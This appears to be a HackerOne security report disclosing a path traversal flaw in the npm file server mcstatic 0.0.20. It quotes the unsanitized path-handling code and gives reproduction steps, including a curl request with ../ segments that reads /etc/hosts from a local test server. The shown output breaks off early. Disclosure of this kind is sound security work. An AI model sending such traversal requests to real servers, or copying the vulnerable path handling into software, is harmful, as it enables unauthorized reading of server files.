Summary:

Hi Guys,

There is Path Traversal in mcstatic module.
It allows to read content of arbitrary files on the remote server.

## Module

**mcstatic**

This is a general file server made by nodejs. It will be easy for you to access the files on the server through the browser.

https://www.npmjs.com/package/mcstatic

version: 0.0.20

## Description

Lack of file path sanitization causes that any file on the server might be read by malicious user.

If we follow code flow, we find that first file name is read from ```req.url``` and check if exists:

```javascript
// node_modules/mcstatic/lib/staticFileHandler.js, line 19:
    var filePath = httpHelpers.getRequestPathFromUrl(req.url);
    var mockedFilePath = findMockFilePath(filePath,mockPaths);
    if(mockedFilePath)
        filePath = mockedFilePath;

    var file = path.normalize(path.join(root,filePath));
    fs.stat(file,function(error, stats){
        if(error)
            return statusHandlers[500](res, nextHandler, { error: error });
```

Depends on HTTP method used, handler function is called (here's for GET):

```javascript
// node_modules/mcstatic/lib/staticFileHandler.js, line 39:
if (req.method === 'GET')
        return responseHandlers.handleGet(res,file, stats, nextHandler);
```

```handleGet``` maps to ```streamResponse``` in ```responseHanders.js```:

```javascript
// node_modules/mcstatic/lib/responseHandlers.js, line 22:
var streamResponse = function(res, file, stat, next){
    var stream = fs.createReadStream(file);
    res.setHeader('content-length', stat.size);

    stream.pipe(res);
    stream.on('error', function (err) {
        statusHandlers['500'](res, next, { error: err });
    });

    stream.on('end', function () {
        res.statusCode = 200;
        res.end();
    });
};
```

We can see (line 23) that ```stream``` is created directly from ```file``` and piped to ```res``` response object.


## Steps To Reproduce:


- install ```mcstatic```:

```
$ npm install mcstatic
```

- run ```mcstatic``` in direcotry of your choice:

```
me:~/playground/hackerone/Node$ ./node_modules/mcstatic/bin/mcstatic 
mcstatic serving ./ on port 8080
```

- execute following ```curl``` command (adjust number of ../ to reflect your system):

```
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/hosts
```

- see result:

```
*   Trying 127.0.0.1...
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)

Please feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.

I hope my report will help to keep Node.js ecosystem and its users safe in the future.
